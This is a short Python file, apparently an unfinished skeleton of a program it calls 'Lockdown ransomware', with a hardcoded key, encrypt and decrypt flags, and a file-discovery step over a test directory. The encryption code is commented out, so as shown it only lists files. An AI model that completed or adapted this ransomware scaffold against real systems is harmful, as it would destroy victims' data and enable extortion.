# from Crypto.Cipher import AES
import argparse
import os
import file_discover

encryption_key = 'grc2019'


def get_parser():
    parser = argparse.ArgumentParser(description='Lockdown ransomware')
    parser.add_argument('-e', '--encrypt', help ='encrypt files [start in root directory]', action="store_true")
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]', action="store_true")

    return parser


def main():
    parser = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    encrypt = args['encrypt']

    if decrypt:
        print("certo")

    elif encrypt:
        # encryptor = AES.new()
        path = '/tmp/guest-098mp6/Área de Trabalho/lockdown/teste'
        files = file_discover.discover(path)
        for i in files:
            print(files)

    else:
        raise Exception("Wrong argument")


if __name__ == '__main__':
    main()
